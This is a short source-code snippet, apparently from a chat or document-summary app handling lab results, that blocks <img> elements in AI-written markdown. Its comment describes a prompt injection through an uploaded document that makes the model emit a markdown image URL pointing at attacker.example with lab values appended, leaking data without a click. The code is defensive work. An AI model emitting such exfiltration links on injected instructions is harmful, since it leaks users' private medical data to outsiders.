// Elements never rendered from AI-written markdown (chat answers, document
// summaries). An <img> loads its URL the moment it is shown, so a prompt
// injected through an uploaded document could make the model emit
// ![](https://attacker.example/?d=<lab values>) and leak data with no
// click. Links stay: they need a click and show their target.
export const NO_REMOTE_IMAGES = ['img'];
